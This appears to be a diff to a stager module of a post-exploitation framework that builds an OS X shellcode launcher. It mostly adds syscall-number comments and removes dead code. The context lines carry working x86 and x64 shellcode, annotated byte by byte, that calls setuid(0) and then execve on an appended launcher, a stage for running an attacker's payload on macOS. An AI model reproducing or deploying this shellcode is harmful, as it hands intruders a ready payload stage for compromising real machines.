@@ -13,7 +13,7 @@ class Stager:
             'Description': ('Generate an osx shellcode launcher'),
 
             'Comments': [
-                ''
+                'Shellcode contains NULL bytes, may need to be encoded.'
             ]
         }
 
@@ -86,7 +86,7 @@ class Stager:
                 return ""
             elif arch.lower() == 'x86':
                 sc = (
-                    # int setuid(uid_t uid)
+                    # 0x17: int setuid(uid_t uid)
                     '\x31\xdb'                      # xor ebx, ebx          ; Zero out ebx
                     '\x53'                          # push ebx              ; Set uid_t uid (NULL)
                     '\x53'                          # push ebx              ; Align stack (8)
@@ -95,7 +95,7 @@ class Stager:
                     '\xcd\x80'                      # int 0x80              ; Call sys_setuid
                     '\x83\xc4\x08'                  # add esp, 8            ; Fix stack (args)
 
-                    # int execve(const char *path, char *const argv[], char *const envp[])
+                    # 0x3b: int execve(const char *path, char *const argv[], char *const envp[])
                     '\x53'                          # push ebx              ; Terminate pointer array
                     '\xeb\x2c'                      # jmp get_payload       ; Retrieve pointer to payload
                                                 # got_payload:
@@ -117,22 +117,22 @@ class Stager:
                     '\xcd\x80'                      # int 0x80              ; Call sys_execve
                     '\x83\xc4\x20'                  # add esp, 32           ; Fix stack (args, array[4])
 
-                    # void exit(int status)
+                    # 0x01: void exit(int status)
                     '\x31\xc0'                      # xor eax, eax          ; Zero out eax
                     '\x40'                          # inc eax               ; Prepare sys_exit
                     '\xcd\x80'                      # int 0x80              ; Call sys_exit
 
-                    # get_payload:
+                                                # get_payload:
                     '\xe8\xcf\xff\xff\xff'          # call got_payload      ; Push pointer to payload
                 )
             else:
                 sc = (
-                    # int setuid(uid_t uid)
+                    # 0x2000017: int setuid(uid_t uid)
                     '\x48\x31\xff'                      # xor rdi, rdi          ; Set uid_t uid (NULL)
                     '\x48\xc7\xc0\x17\x00\x00\x02'      # mov rax, 0x2000017    ; Prepare sys_setuid
                     '\x0f\x05'                          # syscall               ; Call sys_setuid
 
-                    # int execve(const char *path, char *const argv[], char *const envp[])
+                    # 0x200003b: int execve(const char *path, char *const argv[], char *const envp[])
                     '\x48\x31\xd2'                      # xor rdx, rdx          ; Set char *const envp[] (NULL)
                     '\x52'                              # push rdx              ; Terminate pointer array
                     '\xeb\x32'                          # jmp get_payload       ; Retrieve pointer to payload
@@ -150,7 +150,7 @@ class Stager:
                     '\x0f\x05'                          # syscall               ; Call sys_execve
                     '\x48\x83\xc4\x20'                  # add rsp, 32           ; Fix stack (array[4])
 
-                    # void exit(int status)
+                    # 0x2000001: void exit(int status)
                     '\x48\xc7\xc0\x01\x00\x00\x02'      # mov rax, 0x2000001    ; Prepare sys_exit
                     '\x0f\x05'                          # syscall               ; Call sys_exit
 
@@ -158,8 +158,3 @@ class Stager:
                     '\xe8\xc9\xff\xff\xff'              # call got_payload      ; Push pointer to payload
                 )
             return sc + launcher + '\x00'
-
-
-                ##launcher = launcher.strip('echo').strip(' | /usr/bin/python &').strip("\"")
-                #shellcode = self.mainMenu.stagers.generate_osx_shellcode(launcher, arch)
-                #return shellcode
